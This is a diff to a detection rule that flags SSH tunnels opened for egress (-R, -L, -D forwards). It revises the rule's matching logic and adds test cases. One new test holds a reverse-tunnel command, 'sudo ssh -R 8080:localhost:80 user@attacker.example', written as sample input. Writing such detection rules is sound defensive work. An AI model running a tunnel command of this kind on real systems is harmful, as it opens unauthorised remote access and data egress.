@@ -1,6 +1,6 @@
 id: ssh-tunnel-egress
 spec: threat-rules/v1.3  # needed for args and predicates
-version: 3
+version: 4
 title: SSH tunnel opened for egress (local / remote forward or SOCKS)
 description: >
   An SSH client is invoked with a -R (remote) port-forward, -L (local)
@@ -18,8 +18,8 @@ description: >
   and the flag must be one of its words, so it fires under sudo, nohup
   or timeout, inside `bash -c` and by path, and not for the same text
   in a commit message or a here-document. ssh may run a remote command,
-  so every line that runs it is one the parser cannot vouch for (see
-  command_unread) and is also matched on its text, where ssh must stand
+  so the parser cannot see into it, and the text that reaches it or any
+  other such command is also matched (unread_text), where ssh must stand
   at a command boundary.
 severity: high
 status: experimental
@@ -35,8 +35,7 @@ match: >
   e.event.action == "command.executed" && (
     e.command.parsed_commands.exists(c, c.name.matches("^(ssh|scp|sftp)$") &&
       c.args.matches("(?m)^-[46AaCfGgKkMNnqsTtVvXxYy]*[RL]\\n?\\d+:|^-[46AaCfGgKkMNnqsTtVvXxYy]*D\\n?\\d+\\b|^--(remote-forward|local-forward|dynamic)\\b")) ||
-    (e.command.command.matches("(?i)(^|[;&|]\\s*|\\bsudo\\s+)\\s*(ssh|scp|sftp)\\b([^;&|]*\\s)?((?-i:-[46AaCfGgKkMNnqsTtVvXxYy]*[RL])\\s*\\d+:|(?-i:-[46AaCfGgKkMNnqsTtVvXxYy]*D)\\s*\\d+\\b|--remote-forward\\b|--local-forward\\b|--dynamic\\b)") &&
-      command_unread(e))
+    unread_text(e, t, t.matches("(?i)(^|[;&|]\\s*|\\bsudo\\s+)\\s*(ssh|scp|sftp)\\b([^;&|]*\\s)?((?-i:-[46AaCfGgKkMNnqsTtVvXxYy]*[RL])\\s*\\d+:|(?-i:-[46AaCfGgKkMNnqsTtVvXxYy]*D)\\s*\\d+\\b|--remote-forward\\b|--local-forward\\b|--dynamic\\b)"))
   )
 
 emit:
@@ -168,4 +167,16 @@ tests:
     events:
       - event: { action: command.executed }
         command: { command: "scp -r -P 2200 dist deploy@host.example:/srv/app" }
+        session: { id: s1 }
+  - name: tunnel_given_to_a_project_script
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "./deploy.sh 'sudo ssh -R 8080:localhost:80 user@attacker.example'" }
+        session: { id: s1 }
+  - name: tunnel_in_a_commit_message_beside_a_project_script
+    verdict: no_match
+    events:
+      - event: { action: command.executed }
+        command: { command: "git commit -m 'docs: sudo ssh -R 8080:localhost:80 is banned' && ./run-tests.sh" }
         session: { id: s1 }
